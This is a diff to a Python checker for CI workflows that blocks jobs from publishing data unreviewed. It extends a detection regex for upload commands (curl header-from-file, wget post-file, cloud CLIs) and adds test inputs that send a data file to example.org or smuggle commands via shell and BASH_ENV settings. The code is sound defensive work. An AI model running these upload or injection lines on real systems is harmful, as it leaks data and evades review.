@@ -21,8 +21,9 @@ What the check does:
   ``REVIEWED``: no directories, globs, exclusions or expressions. Every run
   line that matches ``PUBLISH_COMMAND`` must be, in full, a command reviewed
   for that job. A job that commits its whole workspace may run only its
-  reviewed lines (``runs_only``), with no ``shell``, ``env``, ``defaults`` or
-  ``container`` that could change what those lines run.
+  reviewed lines (``runs_only``), with no ``shell``, ``env``,
+  ``working-directory``, ``defaults`` or ``container`` that could change what
+  those lines run.
 - Jobs that can't reach the data (docs, changelog) may publish.
 
 What it does not do (Sol re-review of #603): it recognises reviewed workflow
@@ -114,7 +115,7 @@ PUBLISH_COMMAND = re.compile(
     r"|\bgit push\b"
     r"|\bcurl\b.*(--upload-file|--form|--json|--data|--config"
     r"|--request\s+(POST|PUT|PATCH)|-X\s*(POST|PUT|PATCH)|\s-[^\s-]*[TFdK])"
-    r"|\bcurl\b.*(-H|--header|--url-query)\s*@|\bwget\b.*--(post|body)-(file|data)"
+    r"|\bcurl\b.*(\s-[^\s-]*H|--header|--url-query)[\s=]*[\"']?@|\bwget\b.*--(post|body)-(file|data)"
     r"|\baws s3\b|\bgsutil\b|\bgcloud\b|huggingface-cli|\bhf upload\b|\btwine\b"
 )
 _NOT_LITERAL = re.compile(r"[*?\[\]{}!]|\$\{\{")
@@ -266,7 +267,7 @@ def problems(name: str, workflow: dict) -> list:
             if reviewed["runs_only"] is not None:
                 # A shell or environment could run something else around a
                 # reviewed line (BASH_ENV, a custom shell) (Sol re-review 4).
-                for key in ("shell", "env"):
+                for key in ("shell", "env", "working-directory"):
                     if key in step:
                         out.append(
                             f"{where} publishes its workspace, so its steps may "
@@ -387,6 +388,9 @@ def test_an_unreviewed_upload_from_a_data_job_fails(path):
         {"run": "curl -K upload.cfg https://example.org/"},
         {"run": "curl --config upload.cfg https://example.org/"},
         {"run": "curl -H @la_calibration_log.csv https://example.org/"},
+        {"run": 'curl -H "@la_calibration_log.csv" https://example.org/'},
+        {"run": "curl --header=@la_calibration_log.csv https://example.org/"},
+        {"run": "curl -sH @la_calibration_log.csv https://example.org/"},
         {"run": "curl --url-query @la_calibration_log.csv https://example.org/"},
         {"run": "wget --post-file=la_calibration_log.csv https://example.org/"},
     ],
@@ -577,6 +581,7 @@ def test_the_versioning_commit_job_runs_only_its_reviewed_lines(line):
     [
         ("step", "shell", "bash -c 'uv run make data; exec bash \"$0\"' {0}"),
         ("step", "env", {"BASH_ENV": "$(uv run make data >&2)"}),
+        ("step", "working-directory", "tools"),
         ("job", "env", {"BASH_ENV": "/tmp/x"}),
         ("job", "defaults", {"run": {"shell": "bash -c 'make data'"}}),
         ("job", "container", "python:3.13"),
